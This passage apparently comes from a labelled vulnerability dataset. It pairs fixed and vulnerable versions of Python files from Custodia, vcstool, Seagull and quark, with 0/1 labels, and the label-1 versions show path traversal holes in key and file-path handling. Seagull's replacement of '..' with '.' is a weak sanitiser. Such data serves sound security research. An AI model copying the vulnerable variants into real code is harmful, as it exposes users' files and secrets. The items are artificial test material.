        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def _absolute_key(self, key):
        """"""Get absolute path to key and validate key""""""
        if '//' in key:
            raise ValueError(""Invalid empty components in key '%s'"" % key)
        parts = key.split('/')
        if set(parts).intersection({'.', '..'}):
            raise ValueError(""Invalid relative components in key '%s'"" % key)
        return '/'.join([self.namespace] + parts).replace('//', '/')

    def get(self, key):
        try:
            result = self.etcd.get(self._absolute_key(key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = self._absolute_key(keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(self._absolute_key(key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",0
99,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"/custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",1
100,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def _absolute_key(self, key):
        """"""Get absolute path to key and validate key""""""
        if '//' in key:
            raise ValueError(""Invalid empty components in key '%s'"" % key)
        parts = key.split('/')
        if set(parts).intersection({'.', '..'}):
            raise ValueError(""Invalid relative components in key '%s'"" % key)
        return '/'.join([self.namespace] + parts).replace('//', '/')

    def get(self, key):
        try:
            result = self.etcd.get(self._absolute_key(key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = self._absolute_key(keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(self._absolute_key(key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",0
101,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"/custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",1
102,5b69299c8c54f5a7d359b12aa3e342bf10d30485,"vcstool/commands/command.py/n/nimport argparse
import os


class Command(object):

    def __init__(self, args):
        self.debug = args.debug
        self.paths = args.paths
        self.output_repos = args.repos
        for path in self.paths:
            if not os.path.exists(path):
                raise RuntimeError()

    def get_command_line(self, client):
        raise NotImplementedError()


def add_common_arguments(parser):
    group = parser.add_argument_group('Common parameters')
    group.add_argument('--debug', action='store_true', default=False, help='Show debug messages')
    group.add_argument('--repos', action='store_true', default=False, help='List repositories which the command operates on')
    group.add_argument('paths', nargs='*', type=existing_dir, default=[os.curdir], help='Base paths to look for repositories')


def existing_dir(path):
    if not os.path.exists(path):
        raise argparse.ArgumentTypeError(""Path '%s' does not exist."" % path)
    if not os.path.isdir(path):
        raise argparse.ArgumentTypeError(""Path '%s' is not a directory."" % path)
    return path
/n/n/nvcstool/crawler.py/n/nimport os

from . import vcstool_clients


def find_repositories(paths):
    repos = []
    visited = []
    for path in paths:
        _find_repositories(path, repos, visited)
    return repos


def _find_repositories(path, repos, visited):
    abs_path = os.path.abspath(path)
    if abs_path in visited:
        return
    visited.append(abs_path)

    client = get_vcs_client(path)
    if client:
        repos.append(client)
    else:
        try:
            listdir = os.listdir(path)
        except OSError:
            listdir = []
        for name in listdir:
            subpath = os.path.join(path, name)
            if not os.path.isdir(subpath):
                continue
            _find_repositories(subpath, repos, visited)


def get_vcs_client(path):
    for vcs_type in vcstool_clients:
        if vcs_type.is_repository(path):
            return vcs_type(path)
    return None
/n/n/nvcstool/executor.py/n/nimport os
import subprocess
import sys

from .crawler import find_repositories


def execute(command):
    # determine repositories
    clients = find_repositories(command.paths)
    if command.output_repos:
        ordered_clients = dict((client.path, client) for client in clients)
        for k in sorted(ordered_clients.keys()):
            client = ordered_clients[k]
            print('%s (%s)' % (k, client.type))

    jobs = {}
    for client in clients:
        # generate command line
        cmd = command.get_command_line(client)
        job = {'client': client, 'cmd': cmd}
        if not cmd:
            cmd = ['echo', '""%s"" is not implemented for client ""%s""' % (command.__class__.__name__, client.type)]
        if command.debug:
            print('Executing shell command ""%s"" in ""%s""' % (' '.join(cmd), client.path))
        # execute command line
        p = subprocess.Popen(cmd, shell=False, cwd=os.path.abspath(client.path), stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        job['process'] = p
        jobs[p.pid] = job

    # wait for all jobs to finish
    wait_for = jobs.keys()
    while wait_for:
        # wait for any/next process
        try:  # if os.name == 'posix':
            pid, retcode = os.wait()
        except AttributeError:
            pid, retcode = os.waitpid(wait_for[0], 0)
        # collect retcode and output
        if pid in wait_for:
            wait_for.remove(pid)
            job = jobs[pid]
            job['retcode'] = retcode
            job['stdout'] = job['process'].stdout.read()
            # indicate progress
            if len(jobs) > 1:
                if job['cmd']:
                    if retcode == 0:
                        sys.stdout.write('.')
                    else:
                        sys.stdout.write('E')
                else:
                    sys.stdout.write('s')
                sys.stdout.flush()
    if len(jobs) > 1:
        print('')  # finish progress line

    # output results in alphabetic order
    path_to_pid = {job['client'].path: pid for pid, job in jobs.items()}
    pids_in_order = [path_to_pid[path] for path in sorted(path_to_pid.keys())]
    for pid in pids_in_order:
        job = jobs[pid]
        client = job['client']
        print(ansi('bluef') + '=== ' + ansi('boldon') + client.path + ansi('boldoff') + ' (' + client.type + ') ===' + ansi('reset'))
        output = job['stdout'].rstrip()
        if job['retcode'] != 0:
            if not output:
                output = 'Failed with retcode %d' % job['retcode']
            output = ansi('redf') + output + ansi('reset')
        elif not job['cmd']:
            output = ansi('yellowf') + output + ansi('reset')
        if output:
            print(output)


def ansi(keyword):
    codes = {
        'bluef': '\033[34m',
        'boldon': '\033[1m',
        'boldoff': '\033[22m',
        'redf': '\033[31m',
        'reset': '\033[0m',
        'yellowf': '\033[33m',
    }
    if keyword in codes:
        return codes[keyword]
    return ''
/n/n/n",0
103,5b69299c8c54f5a7d359b12aa3e342bf10d30485,"/vcstool/commands/command.py/n/nimport os


class Command(object):

    def __init__(self, args):
        self.debug = args.debug
        self.path = args.path
        self.repos = args.repos

    def get_command_line(self, client):
        raise NotImplementedError()


def add_common_arguments(parser):
    group = parser.add_argument_group('Common parameters')
    group.add_argument('--debug', action='store_true', default=False, help='Show debug messages')
    group.add_argument('--repos', action='store_true', default=False, help='List repositories which the command operates on')
    group.add_argument('path', nargs='?', default=os.curdir, help='Base path to look for repositories')
/n/n/n/vcstool/crawler.py/n/nimport os

from . import vcstool_clients


def find_repositories(path):
    repos = []
    client = get_vcs_client(path)
    if client:
        repos.append(client)
    else:
        try:
            listdir = os.listdir(path)
        except OSError:
            listdir = []
        for name in listdir:
            subpath = os.path.join(path, name)
            if not os.path.isdir(subpath):
                continue
            repos += find_repositories(subpath)
    return repos


def get_vcs_client(path):
    for vcs_type in vcstool_clients:
        if vcs_type.is_repository(path):
            return vcs_type(path)
    return None
/n/n/n/vcstool/executor.py/n/nimport os
import subprocess
import sys

from .crawler import find_repositories


def execute(command):
    # determine repositories
    clients = find_repositories(command.path)
    if command.repos:
        ordered_clients = dict((client.path, client) for client in clients)
        for k in sorted(ordered_clients.keys()):
            client = ordered_clients[k]
            print('%s (%s)' % (k, client.type))

    jobs = {}
    for client in clients:
        # generate command line
        cmd = command.get_command_line(client)
        job = {'client': client, 'cmd': cmd}
        if not cmd:
            cmd = ['echo', '""%s"" is not implemented for client ""%s""' % (command.__class__.__name__, client.type)]
        if command.debug:
            print('Executing shell command ""%s"" in ""%s""' % (' '.join(cmd), client.path))
        # execute command line
        p = subprocess.Popen(cmd, shell=False, cwd=os.path.abspath(client.path), stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        job['process'] = p
        jobs[p.pid] = job

    # wait for all jobs to finish
    wait_for = jobs.keys()
    while wait_for:
        # wait for any/next process
        try:  # if os.name == 'posix':
            pid, retcode = os.wait()
        except AttributeError:
            pid, retcode = os.waitpid(wait_for[0], 0)
        # collect retcode and output
        if pid in wait_for:
            wait_for.remove(pid)
            job = jobs[pid]
            job['retcode'] = retcode
            job['stdout'] = job['process'].stdout.read()
            # indicate progress
            if len(jobs) > 1:
                if job['cmd']:
                    if retcode == 0:
                        sys.stdout.write('.')
                    else:
                        sys.stdout.write('E')
                else:
                    sys.stdout.write('s')
                sys.stdout.flush()
    if len(jobs) > 1:
        print('')  # finish progress line

    # output results in alphabetic order
    path_to_pid = {job['client'].path: pid for pid, job in jobs.items()}
    pids_in_order = [path_to_pid[path] for path in sorted(path_to_pid.keys())]
    for pid in pids_in_order:
        job = jobs[pid]
        client = job['client']
        print(ansi('bluef') + '=== ' + ansi('boldon') + client.path + ansi('boldoff') + ' (' + client.type + ') ===' + ansi('reset'))
        output = job['stdout'].rstrip()
        if job['retcode'] != 0:
            if not output:
                output = 'Failed with retcode %d' % job['retcode']
            output = ansi('redf') + output + ansi('reset')
        elif not job['cmd']:
            output = ansi('yellowf') + output + ansi('reset')
        if output:
            print(output)


def ansi(keyword):
    codes = {
        'bluef': '\033[34m',
        'boldon': '\033[1m',
        'boldoff': '\033[22m',
        'redf': '\033[31m',
        'reset': '\033[0m',
        'yellowf': '\033[33m',
    }
    if keyword in codes:
        return codes[keyword]
    return ''
/n/n/n",1
104,1fb790712fe0c1d1957b31e34a8e0e6593af87a7,"seagull/routes/app.py/n/n#
# Seagull photo gallery app
# Copyright (C) 2016  Hajime Yamasaki Vukelic
#
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details.
#

from os.path import join, exists

from bottle import static_file

from streamline import NonIterableRouteBase


class Static(NonIterableRouteBase):
    path = '/static/<path:path>'

    def get_base_paths(self):
        return (self.config['runtime.static_dir'],
                self.config['runtime.assets_dir'])

    @staticmethod
    def get_first_base(bases, path):
        """"""
        Return the first base path within which the path is found

        The last base path is always returned such that 404 errors are handled
        by bottle.
        """"""
        for b in bases:
            if not exists(join(b, path)):
                continue
            return b
        return b

    @staticmethod
    def sanitize_path(path):
        if path.startswith('/'):
            path = path[1:]
        return path.replace('..', '.')

    def get(self, path):
        path = self.sanitize_path(path)
        base_paths = self.get_base_paths()
        if hasattr(base_paths, 'split'):
            # String, so go simple
            base_path = base_paths
        else:
            base_path = self.get_first_base(base_paths, path)
        return static_file(path, base_path)

/n/n/nseagull/routes/gallery.py/n/n#
# Seagull photo gallery app
# Copyright (C) 2016  Hajime Yamasaki Vukelic
#
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details.
#

from .app import Static
from ..app.templating import TemplateRoute
from ..gallery.pager import Pager


class Main(TemplateRoute):
    """"""
    Main page
    """"""
    path = '/'
    template_name = 'main.mako'

    @property
    def current_page(self):
        try:
            return int(self.request.query['page'])
        except (KeyError, ValueError, TypeError):
            return 1

    def get(self):
        index = self.config['runtime.gallery']
        pager = Pager(index, self.current_page)
        return {'pager': pager}


class Image(Static):
    path = '/gallery/<path:path>'

    def get_base_paths(self):
        return self.config['runtime.gallery_dir']


class Reindex(TemplateRoute):
    path = '/reindex/<token>'
    template_name = 'reset.mako'

    def get(self, token):
        index = self.config['runtime.gallery']
        index.rescan()
        return {}
/n/n/n",0
105,1fb790712fe0c1d1957b31e34a8e0e6593af87a7,"/seagull/routes/app.py/n/n#
# Seagull photo gallery app
# Copyright (C) 2016  Hajime Yamasaki Vukelic
#
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details.
#

from bottle import static_file

from streamline import NonIterableRouteBase


class Static(NonIterableRouteBase):
    path = '/static/<path:path>'

    def get_base_path(self):
        return self.config['runtime.static_dir']

    def get(self, path):
        return static_file(path, self.get_base_path())
/n/n/n/seagull/routes/gallery.py/n/n#
# Seagull photo gallery app
# Copyright (C) 2016  Hajime Yamasaki Vukelic
#
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details.
#

from .app import Static
from ..app.templating import TemplateRoute
from ..gallery.pager import Pager


class Main(TemplateRoute):
    """"""
    Main page
    """"""
    path = '/'
    template_name = 'main.mako'

    @property
    def current_page(self):
        try:
            return int(self.request.query['page'])
        except (KeyError, ValueError, TypeError):
            return 1

    def get(self):
        index = self.config['runtime.gallery']
        pager = Pager(index, self.current_page)
        return {'pager': pager}


class Image(Static):
    path = '/gallery/<path:path>'

    def get_base_path(self):
        return self.config['runtime.gallery_dir']


class Reindex(TemplateRoute):
    path = '/reindex/<token>'
    template_name = 'reset.mako'

    def get(self, token):
        index = self.config['runtime.gallery']
        index.rescan()
        return {}
/n/n/n",1
106,136576b3d9c82ec53d67c3b273b6bb356312d763,"quark/subproject.py/n/nimport logging
import json
import os
from os.path import exists, join, isdir
from shutil import rmtree
from subprocess import call, PIPE, Popen, CalledProcessError, run
from urllib.parse import urlparse
import shutil

import xml.etree.ElementTree as ElementTree

from quark.utils import DirectoryContext as cd, fork, log_check_output
from quark.utils import freeze_file, dependency_file, mkdir, load_conf

logger = logging.getLogger(__name__)

class QuarkError(RuntimeError):
    pass

def url_from_directory(directory, include_commit = True):
    if exists(join(directory, "".svn"")):
        cls = SvnSubproject
    elif exists(join(directory, "".git"")):
        cls = GitSubproject
    else:
        raise QuarkError(""Couldn't detect repository type for directory %s"" % directory)
    return cls.url_from_directory(directory, include_commit)

def not_a_project(directory, proj_type):
    raise QuarkError(""""""

Directory '%s' isn't a %s sandbox,
but it's marked as such in a subproject.quark.

Either:
- it was previously a subproject of a different kind (e.g. the catalog changed
  it from Subversion to Git);
- it's committed in the root project;
- it's a local modification.

Please remove it and re-run quark up.
"""""" % (directory, proj_type))



class Subproject:
    @staticmethod
    def _parse_fragment(url):
        res = {}
        for equality in url.fragment.split():
            index = equality.find('=')
            key = equality[:index]
            value = equality[index + 1:]
            res[key] = value
        return res

    @staticmethod
    def create(name, urlstring, directory, options, conf = {}, **kwargs):
        url = urlparse(urlstring)
        args = (name, url, directory, options, conf)
        if urlstring is None:
            # fake project, used for non-versioned root
            res = Subproject(name, directory, options, conf, **kwargs)
        elif url.scheme.startswith('git'):
            res = GitSubproject(*args, **kwargs)
        elif url.scheme.startswith('svn'):
            res = SvnSubproject(*args, **kwargs)
        else:
            raise ValueError(""Unrecognized dependency for url '%s'"", urlstring)
        res.urlstring = urlstring
        return res

    @staticmethod
    def create_dependency_tree(source_dir, url=None, options=None, update=False):
        # make sure the separator is present
        source_dir_rp = os.path.join(os.path.realpath(source_dir), '')
        root = Subproject.create(""root"", url, source_dir, {}, {}, toplevel = True)
        if url and update:
            root.checkout()
        conf = load_conf(source_dir)
        if conf is None:
            return root, {}
        subproject_dir = join(source_dir, conf.get(""subprojects_dir"", 'lib'))
        stack = [root]
        modules = {}

        def get_option(key):
            try:
                return root.options[key]
            except KeyError as e:
                err = e
            for module in modules.values():
                try:
                    return module.options[key]
                except KeyError as e:
                    err = e
            raise err

        def add_module(parent, name, uri, options, conf, **kwargs):
            if uri is None:
                # options add only, lookup from existing modules
                uri = modules[name].urlstring
            target_dir = join(subproject_dir, name)
            target_dir_rp = os.path.join(os.path.realpath(target_dir), '')
            if not target_dir_rp.startswith(source_dir_rp):
                raise QuarkError(""""""
Subproject `%s` (URI: %s)
is trying to escape from the main project directory (`%s`)
subproject realpath:   %s
main project realpath: %s"""""" % (name, uri, source_dir, target_dir_rp, source_dir_rp))
            newmodule = Subproject.create(name, uri, target_dir, options, conf, **kwargs)
            mod = modules.setdefault(name, newmodule)
            if mod is newmodule:
                mod.parents.add(parent)
                if update:
                    mod.update()
            else:
                if newmodule.exclude_from_cmake != mod.exclude_from_cmake:
                    children_conf = [join(parent.directory, dependency_file) for parent in mod.parents]
                    parent_conf = join(parent.directory, dependency_file)
                    raise ValueError(""Conflicting value of 'exclude_from_cmake'""
                                     "" attribute for module '%s': %r required by %s and %r required by %s"" %
                                     (name, mod.exclude_from_cmake, children_conf, newmodule.exclude_from_cmake,
                                      parent_conf)
                                     )
                if not newmodule.same_checkout(mod) and uri is not None:
                    children = [join(parent.directory, dependency_file) for parent in mod.parents]
                    parent = join(parent.directory, dependency_file)
                    raise ValueError(
                        ""Conflicting URLs for module '%s': '%s' required by %s and '%s' required by '%s'"" %
                        (name,
                         mod.urlstring, children,
                         newmodule.urlstring, parent))

                else:
                    for key, value in options.items():
                        mod.options.setdefault(key, value)
                        if mod.options[key] != value:
                            raise ValueError(
                                ""Conflicting values option '%s' of module '%s'"" % (key, mod.name)
                            )
            stack.append(mod)
            parent.children.add(mod)

        freeze_conf = join(root.directory, freeze_file)
        if exists(freeze_conf):
            with open(freeze_conf, 'r') as f:
                freeze_dict = json.load(f)
        else:
            freeze_dict = {}
        if update:
            mkdir(subproject_dir)
        while len(stack):
            current_module = stack.pop()
            if current_module.external_project:
                generate_cmake_script(current_module.directory, update = update)
                continue
            conf = load_conf(current_module.directory)
            if conf:
                if current_module.toplevel:
                    current_module.options = conf.get('toplevel_options', {})
                    if options:
                        current_module.options.update(options)
                for name, depobject in conf.get('depends', {}).items():
                    external_project = depobject.get('external_project', False)
                    add_module(current_module, name,
                               freeze_dict.get(name, depobject.get('url', None)), depobject.get('options', {}),
                               depobject,
                               exclude_from_cmake=depobject.get('exclude_from_cmake', external_project),
                               external_project=external_project,
                               )
                for key, optobjects in conf.get('optdepends', {}).items():
                    if isinstance(optobjects, dict):
                        optobjects = [optobjects]
                    for optobject in optobjects:
                        try:
                            value = get_option(key)
                        except KeyError:
                            continue
                        if value == optobject['value']:
                            for name, depobject in optobject['depends'].items():
                                add_module(current_module, name,
                                           freeze_dict.get(name, depobject.get('url', None)),
                                           depobject.get('options', {}),
                                           depobject)
        return root, modules

    def __init__(self, name=None, directory=None, options=None, conf = {}, exclude_from_cmake=False, external_project=False, toplevel = False):
        self.conf = conf
        self.parents = set()
        self.children = set()
        self.name = name
        self.directory = directory
        self.options = options or {}
        self.exclude_from_cmake = exclude_from_cmake
        self.external_project = external_project
        self.toplevel = toplevel

    def __hash__(self):
        return self.name.__hash__()

    def same_checkout(self, other):
        return True

    def checkout(self):
        raise NotImplementedError()

    def update(self):
        raise NotImplementedError()

    def status(self):
        print(""Unsupported external %s"" % self.directory)

    def local_edit(self):
        raise NotImplementedError()

    def url_from_checkout(self, *args, **kwargs):
        return self.url_from_directory(directory = self.directory, *args, **kwargs)

    def mirror(self, dest):
        raise NotImplementedError()

    def toJSON(self):
        return {
            ""name"": self.name,
            ""children"": [child.toJSON() for child in self.children],
            ""options"": self.options,
        }


class GitSubproject(Subproject):
    def __init__(self, name, url, directory, options, conf = {}, **kwargs):
        super().__init__(name, directory, options, conf, **kwargs)
        self.ref_is_commit = False
        self.ref = 'origin/HEAD'
        if url.fragment:
            fragment = Subproject._parse_fragment(url)
            if 'commit' in fragment:
                self.ref = fragment['commit']
                self.ref_is_commit = True
            elif 'tag' in fragment:
                self.ref = fragment['tag']
            elif 'branch' in fragment:
                self.ref = 'origin/%s' % fragment['branch']
        self.url = url._replace(fragment='')._replace(scheme=url.scheme.replace('git+', ''))

    def same_checkout(self, other):
        if isinstance(other, GitSubproject) and (self.url, self.ref, self.conf.get(""shallow"", False)) == (other.url, other.ref, other.conf.get(""shallow"", False)):
            return True
        return False

    def check_origin(self):
        with cd(self.directory):
            if log_check_output(['git', 'config', '--get', 'remote.origin.url']) != self.url:
                if not self.has_local_edit():
                    logger.warning(""%s is not a clone of %s ""
                                   ""but it hasn't local modifications, ""
                                   ""removing it.."", self.directory, self.url.geturl())
                    rmtree(self.directory)
                    self.checkout()
                else:
                    raise ValueError(
                        ""'%s' is not a clone of '%s' and has local""
                        "" modifications, I don't know what to do with it..."" %
                        self.directory, self.url.geturl())

    def noremote_ref(self):
        nr_ref = self.ref
        if '/' in nr_ref:
            nr_ref = nr_ref.split('/', 1)[1]
        return nr_ref


    def checkout(self):
        shallow = self.conf.get(""shallow"", False)

        if self.ref_is_commit and shallow:
            # We cannot straight clone a shallow repo using a commit hash (-b doesn't support it)
            # do the dance described at https://stackoverflow.com/a/43136160/214671
            os.mkdir(self.directory)
            with cd(self.directory):
                fork(['git', 'init'])
                fork(['git', 'remote', 'add', 'origin', self.url.geturl()])
                fork(['git', 'fetch', '--depth', '1', 'origin', self.noremote_ref()])
                fork(['git', 'checkout', self.ref])
        else:
            # Regular case
            extra_opts = []
            if shallow:
                extra_opts += [""--depth"", ""1""]
            # Needed essentially for the shallow case, as for full clones the
            # git clone -n + git checkout would suffice
            if not self.ref_is_commit and self.ref != 'origin/HEAD':
                extra_opts += ['-b', self.noremote_ref()]
            fork(['git', 'clone', '-n'] + extra_opts + ['--', self.url.geturl(), self.directory])
            with cd(self.directory):
                fork(['git', 'checkout', self.ref, '--'])

    def update(self):
        if not exists(self.directory):
